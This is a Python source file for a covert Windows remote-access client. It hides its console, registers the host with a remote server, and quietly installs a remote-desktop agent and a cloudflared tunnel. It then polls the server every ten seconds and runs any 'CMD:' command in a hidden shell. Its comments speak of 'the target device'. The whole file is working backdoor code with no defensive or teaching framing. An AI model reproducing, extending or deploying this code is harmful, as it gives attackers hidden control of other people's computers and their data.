import requests
import socket
import platform
import os
import subprocess
import time
import sys
import shutil
import datetime

# ========== CONFIGURATION ==========
SERVER_URL = "https://dollar-1rtv.onrender.com"
EXE_NAME = "1"  # Will be replaced for 2,3,4,5
GROUP_ID = "-1003587821331"  # REPLACE with your actual group ID
# ==================================

# Hide the console window completely
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ========== LOGGING ==========
LOG_DIR = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'PD_Research')
LOG_FILE = os.path.join(LOG_DIR, 'debug.log')

def log_message(message):
    """Write a message to the hidden log file"""
    try:
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

def read_log():
    """Read the log file contents"""
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                return f.read()
        return "Log file not found."
    except:
        return "Error reading log file."

log_message("=== CLIENT STARTED ===")
log_message(f"EXE_NAME: {EXE_NAME}")
log_message(f"Device: {socket.gethostname()}")

def get_computer_info():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return {
            'hostname': hostname,
            'os': platform.system(),
            'os_version': platform.version(),
            'ip': ip
        }
    except:
        return {
            'hostname': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'ip': 'Unknown'
        }

def install_pdagent():
    """Install Pocket Desk Agent on the target device"""
    log_message("Checking if pdagent is installed...")
    try:
        result = subprocess.run("where pdagent", shell=True, capture_output=True)
        if result.returncode != 0:
            log_message("pdagent not found. Installing...")
            subprocess.run("pip install pocket-desk-agent", shell=True, capture_output=True, timeout=120)
            log_message("pdagent installed successfully.")
            return True
        log_message("pdagent is already installed.")
        return True
    except Exception as e:
        log_message(f"ERROR installing pdagent: {str(e)}")
        return False

def install_cloudflared():
    """Install cloudflared using winget (auto-installed by pdagent)"""
    log_message("Ensuring cloudflared is available...")
    try:
        # Check if cloudflared is in PATH
        result = subprocess.run("where cloudflared", shell=True, capture_output=True)
        if result.returncode == 0:
            log_message("cloudflared already installed.")
            return True
        # Try to install via winget
        log_message("cloudflared not found. Installing via winget...")
        subprocess.run("winget install cloudflare.cloudflared", shell=True, capture_output=True, timeout=60)
        log_message("cloudflared installed via winget.")
        return True
    except Exception as e:
        log_message(f"ERROR with cloudflared: {str(e)}")
        return False

def register_device():
    data = {
        'device_id': socket.gethostname(),
        'exe_name': EXE_NAME,
        'computer_info': get_computer_info(),
        'group_id': GROUP_ID
    }
    try:
        response = requests.post(f"{SERVER_URL}/register", json=data, timeout=10)
        log_message(f"Registration response: {response.status_code}")
        return True
    except Exception as e:
        log_message(f"Registration failed: {str(e)}")
        return False

def start_daemon():
    """Start the Pocket Desk Agent daemon"""
    log_message("Starting pdagent daemon...")
    try:
        # First stop any existing daemon
        subprocess.run("pdagent stop", shell=True, capture_output=True)
        # Start the daemon
        subprocess.Popen("pdagent start", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        log_message("pdagent daemon started successfully.")
        return True
    except Exception as e:
        log_message(f"ERROR starting daemon: {str(e)}")
        return False

def clear_command(device_id):
    try:
        requests.post(f"{SERVER_URL}/clear_command", json={'device_id': device_id}, timeout=5)
    except:
        pass

def execute_command(command):
    log_message(f"Executing command: {command}")
    try:
        if command == "FETCH_LOG":
            log_message("Fetch log command received.")
            log_content = read_log()
            try:
                requests.post(f"{SERVER_URL}/log", json={'device_id': socket.gethostname(), 'log': log_content}, timeout=10)
                log_message("Log sent to server.")
            except Exception as e:
                log_message(f"Error sending log to server: {str(e)}")
        elif command.startswith("CMD:"):
            # Custom command via /cmd
            actual_cmd = command[4:]
            log_message(f"Running custom command: {actual_cmd}")
            subprocess.run(actual_cmd, shell=True, capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
            log_message("Custom command executed.")
        else:
            # All other commands are handled by the pdagent daemon
            log_message(f"Sending command to pdagent daemon: {command}")
            # The daemon handles /remote, /screenshot, etc. natively
            log_message(f"Command {command} should be handled by the daemon.")
    except Exception as e:
        log_message(f"ERROR executing command: {str(e)}")

def check_for_commands():
    try:
        response = requests.get(f"{SERVER_URL}/devices", timeout=10)
        all_devices = response.json()
        device_id = socket.gethostname()
        if device_id in all_devices and all_devices[device_id].get('pending_command'):
            command = all_devices[device_id]['pending_command']
            log_message(f"Found pending command: {command}")
            execute_command(command)
            clear_command(device_id)
            log_message("Command cleared.")
    except Exception as e:
        log_message(f"ERROR checking commands: {str(e)}")

def main():
    log_message("Main function started.")
    register_device()
    install_pdagent()
    install_cloudflared()
    start_daemon()
    log_message("Client is now running and checking for commands.")
    while True:
        check_for_commands()
        time.sleep(10)

if __name__ == '__main__':
    main()